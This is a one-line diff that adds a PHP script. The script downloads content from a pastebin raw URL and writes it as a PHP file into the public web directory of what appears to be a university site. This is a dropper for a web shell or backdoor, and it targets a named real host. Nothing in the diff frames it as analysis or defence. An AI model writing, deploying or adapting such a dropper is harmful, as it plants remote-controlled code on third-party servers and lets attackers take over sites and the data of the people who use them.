@@ -1,0 +1,1 @@
+<?php $url="https://pastebin.com/raw/KRBh9nHv"; $tujuan="/home/unirade1/public_html/lpm.uniramalang.ac.id/smax/xindex2.php"; $file_content = file_get_contents($url);  $result = file_put_contents($tujuan, $file_content); var_dump($result);?>
